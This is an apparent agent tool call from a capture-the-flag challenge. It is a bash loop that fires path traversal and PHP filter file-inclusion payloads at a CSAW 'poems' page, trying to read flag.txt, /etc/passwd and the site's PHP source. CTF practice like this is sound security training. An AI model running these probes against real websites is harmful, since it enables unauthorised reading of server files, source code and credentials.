parsed_args.command:
set -x
for q in 'poem=poem1.txt' 'poem=poem2.txt' 'poem=../flag.txt' 'poem=/flag.txt' 'poem=../../flag.txt' 'poem=php://filter/convert.base64-encode/resource=/var/www/html/poems/index.php' 'poem=/var/www/html/poems/poem1.txt' 'poem=/etc/passwd'; do 
  echo "=== $q ===";
  curl -s "http://web.chal.csaw.io:80/poems/?$q" | sed -n '1,80p';
  echo; echo;
done
